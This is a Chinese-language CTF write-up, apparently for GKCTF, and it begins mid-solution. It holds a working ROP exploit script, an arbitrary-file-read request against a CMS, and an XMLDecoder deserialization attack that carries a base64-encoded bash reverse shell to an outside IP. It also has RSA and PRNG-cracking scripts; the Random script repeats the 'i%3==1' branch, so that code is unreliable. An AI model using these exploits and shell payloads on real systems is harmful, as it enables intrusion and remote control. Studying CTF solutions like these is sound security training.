id_ = '' 
for i in range(9): 
    id_ += chr(res[fuckId[i]].as_long()) 
print(id_) 
最后组合得到 flag 
flag{ginkgo_CX@Meaningless_!$!%*@^%#%_Code} 
二：Pwn 
1. checkin 
这有个栈溢出，可以覆盖 rbp 
Pass 是个 md5 加密，在线解一下就行 
然后就是略微麻烦的栈迁移加 ROP 了 
from pwn import * 
context.log_level = 'debug' 
def debug(): 
    gdb.attach(sh,'b *0x401972') 
    pause() 
#sh = process("./login") 
sh = remote("node3.buuoj.cn",29740) 
libc = ELF('./libc.so.6') 
pop_rdi = 0x0000000000401ab3 
pop_rsi_r15 = 0x0000000000401ab1 
pop_rsp_ppp = 0x0000000000401aad 
pop_rbp = 0x0000000000400760 
s1 = b'admin' + p64(0x4018E8) + p64(libc.sym['puts']) + p64(libc.sym['puts']) #+ p64() 
sh.recvuntil(">") 
sh.send(s1) 
payload = b'admin' 
payload = payload.ljust(32,b'\\\\x00') 
payload += p64(0x602400 + 5 - 8) 
#debug() 
sh.recvuntil(">") 
sh.send(payload) 
payload2 = b'aaaaa' + p64(pop_rdi) + p64(0x602028) + p64(0x400680) +  p64(pop_rdi) + p64(0) + 
p64(pop_rsi_r15) + p64(0x602500) + p64(0) + p64(0x4006A0) + p64(pop_rbp) + p64(0x602500-8)  + 
p64(0x4018C5) 
sh.send(payload2) 
libc_base = u64(sh.recvuntil('\\\\x7f')[-6:].ljust(8, b'\\\\x00')) - libc.sym['puts'] 
print(hex(libc_base)) 
system = libc.sym['system'] + libc_base 
sh_addr = libc_base + 0x18CE57 
payload3 = p64(pop_rdi) + p64(sh_addr) + p64(system) 
sh.send(payload3) 
sh.interactive() 
三：Web 
1. ezcms 
    /** 
     * Download theme. 
     * 
     * @param  string    $exportedFile 
     * @access public 
     * @return void 
     */ 
    public function downloadtheme($exportedFile) 
    { 
        $exportedFile = helper::safe64Decode($exportedFile); 
        $fileData = file_get_contents($exportedFile); 
        $pathInfo = pathinfo($exportedFile); 
        $this->loadModel('file')->sendDownHeader($pathInfo['basename'], 
'zip', 
$fileData, 
filesize($exportedFile)); 
    } 
登入后台，简单审计发现有一个任意文件读 
POST /admin.php?m=ui&f=downloadtheme&exportedFile=L2ZsYWc= 
2. babycat 
先是注册，注册后有一个简单的任意文件下载 
看到是纯 Servlet 写的，加大了我做这道题的信心（哈哈哈） 
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, 
IOException { 
    if (!ServletFileUpload.isMultipartContent(req)) { 
      req.setAttribute("error", ""); 
      req.getRequestDispatcher("../WEB-INF/error.jsp").forward((ServletRequest)req, 
(ServletResponse)resp); 
    } 
    DiskFileItemFactory factory = new DiskFileItemFactory(); 
    ...... 
    } 
发现 uploadServlet 并没有验证是不是 admin，可以直接上传 
baseDao 
 public static void getConfig() throws FileNotFoundException { 
    Object obj = (new XMLDecoder(new FileInputStream(System.getenv("CATALINA_HOME") + 
"/webapps/ROOT/db/db.xml"))).readObject(); 
    if (obj instanceof HashMap) { 
      HashMap map = (HashMap)obj; 
      if (map != null && map.get("url") != null) { 
        driver = (String)map.get("driver"); 
        url = (String)map.get("url"); 
        username = (String)map.get("username"); 
        password = (String)map.get("password"); 
      } 
    } 
  } 
  public static Connection getConnection() throws Exception { 
    getConfig(); 
    if (connection == null) 
      try { 
        Class.forName(driver); 
        connection = DriverManager.getConnection(url, username, password); 
      } catch (SQLException|ClassNotFoundException e) { 
        e.printStackTrace(); 
      } 
    return connection; 
  } 
这里直接 xmldecode 反序列化了 
registerServlet 
    try { 
      connection = baseDao.getConnection(); 
    } catch (Exception e) { 
      e.printStackTrace(); 
    } 
这里写的非常奇怪啊，反正注册的时候还会加载一次 
上传../../db/db.xml 
                /bin/bash 
                -c 
{echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMTk1LjE0OS41MC83NTc1IDA+JjEn}|{b
ase64,-d}|{bash,-i} 
然后随便注册一个用户就可以弹了 
四：Crypto 
1. RRRRsa 
套娃题，第一层跟巅峰极客 tryRSA 基本一致，第二层$modq1$稍微变换一下，消去 p1 之后
和 n2 做一次 gcd 就好了，具体看代码实现 
from Crypto.Util.number import * 
from Crypto.Cipher import AES 
import gmpy2 
c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300
8519178879579457661328641513828774621420181298527034372405336846045083799502936432948
7772577367550591262220881343562517769661478160121646580756920138015166994260520842564
5258372134465547452376467465833013387018542999562042758 
n1=7500355737908025221951782599899018322665911701977073508052340956175722588365104088
2547519748107588719498261922816865626714101556207649929655822889945870341168644508079
3175822200343746130667519167500362534239906737642340669993068740784248037746527545874
94762629397701664706287999727238636073466137405374927829 
c1=6811190109202781300709962789389683851742697108287720404711040478782327921150818378
3468891474661365139933325981191524511345219830693064573462115529345012970089065201176
1424174622996507612997580781415041261859213045264149114553952892284449745165035265079
06721378965227166653195076209418852399008741560796631569 
hint1=23552090716381769484990784116875558895715552896983313406764042416318710076256166
4724265535202402650239784499459742184357879292022892083291565948384201908901042264972
6385246192847475602553939499628895182817212641956999330152486675379758403274042625980
4002564701319538183190684075289055345581960776903740881951 
hint2=52723229698530767897979433914470831153268827008372307239630387100752226850798023
3624444992119449967783638945287592905657182663401885822533070048108500308337521327282
5692957270363043123262215120085516088661435000011570468960510250027381515763647690115
0408355565958834764444192860513855376978491299658773170270 
n2=1145359230433759703801179205480974047290430798955403207428478403644550240504731259
9892631164417296017647119360285042760789919181061695302132474213749274615992128498214
6320175356395325890407704697018412456350862990849606200323084717352630282539156670636
025924425865741196506478163922312894384285889848355244489 
c2=6705420366690169118121526258744718091022547333914326010083111831352147102988930417
6235434129632237116993910316978096018724911531011857469325115308802162172965564951703
5834508174892476754580248017745907287264715674078125722104216421714568503521678107554
40990035255967091145950569246426544351461548548423025004 
hint3=25590923416756813543880554963887576960707333607377889401033718419301278802157204
8810391163503218721621189777970690896534281214794866037447005198305971860459314126526
8157206095343965586847631179836801587862800254754083571987008100750573549958144907795
0263721606955524302365518362434928190394924399683131242077 
hint4=10410072692692386956686274123887613236691697086437456294784466955640326895562567
0105641264367038885706425427864941392601593437305258297198111819227915453081797889565
6622760031229011397551530022191263666110217360660167415622329980472533351416762033765
21742965365133597943669838076210444485458296240951668402513 
e1 = 202020 
e2 = 212121 
tt = (hint2 - e2) * inverse(2021, n1) * 2020 % n1 
gcd(pow(tt, e1, n1) - hint1, n1) 
p1 
= 
1086650691304703813774093556674270826183243485664925306529869565257158298560569142764
0899414330824525161279752924895740377208318584484168722588418228539943 
q1 = n1 // p1 
assert p1 * q1 == n1 
phi = (p1-1) * (q1-1) 
d = inverse(65537, phi) 
p = pow(c1, d, n1) 
e3 = 202020 
e4 = 212121 
tt1 = pow(hint3, e2, n2) * inverse(pow(2020, e1*e2, n2), n2) * pow(2021, e1*e2, n2) 
tt2 = pow(hint4, e1, n2) 
gcd(tt2 - tt1, n2) 
q2 
= 
9677269841262626154014538802932467267491753397490444024091702336017847934813782962738
462815968445258898876277887404901976123237057034767859042412249801889 
p2 = n2 // q2 
phi = (p2-1) * (q2-1) 
d = inverse(65537, phi) 
q = pow(c2, d, n2) 
print(f'recover p = {p}') 
print(f'recover q = {q}') 
c 
= 
1349239271746981786688343147545377095183747624137198971468373755839576973141652230085
1917887957945766132864151382877462142018129852703437240533684604508379950293643294877
7257736755059126222088134356251776966147816012164658075692013801516699426052084256452
58372134465547452376467465833013387018542999562042758 
p 
= 
1042787782860796082882419688018998244722787315914405665418260349755382222598411227984
9366464194134744025836953233538120415786132849793748917106511547495617 
q 
= 
8093980956746434856487735743522445882908700376447472091972521786684147548968037093544
291721698931030114136012631370337384386054281793788977456777285384363 
n = int(p) * int(q) 
phi = (p-1) * (q-1) 
d = inverse(65537, phi) 
m = pow(c, d, n) 
print(long_to_bytes(m)) 
# b'GKCTF{f64310b5-d5e6-45cb-ae69-c86600cdf8d8}' 
2. Random 
from randcrack import RandCrack 
from data import data1 
from hashlib import md5 
rc = RandCrack() 
for i in range(len(data1)): 
    if(i%3==0): 
        r = bin(int(data1[i]))[2:].zfill(32)     
        rc.submit(int(r, 2)) 
    if(i%3==1): 
        r = bin(int(data1[i]))[2:].zfill(64)     
        r1 = r[:32] 
        r2 = r[32:] 
        rc.submit(int(r2, 2)) 
        rc.submit(int(r1, 2)) 
    if(i%3==1): 
        r = bin(int(data1[i]))[2:].zfill(96)     
        r1 = r[:32] 
        r2 = r[32:64] 
        r3 = r[64:] 
        rc.submit(int(r3, 2)) 
        rc.submit(int(r2, 2)) 
        rc.submit(int(r1, 2)) 
tmp = rc.predict_getrandbits(32) 
print(tmp) 
flag = md5(str(tmp).encode()).hexdigest() 
print(flag) 
# 14c71fec812b754b2061a35a4f6d8421 
五：Misc 
1. 签到 
打开 wireshark，跟踪 http 流，复制最长的那段 base64 的 
打开 ipython，用 ctfbox 解几次编码，最后将双写去掉就能拿到 flag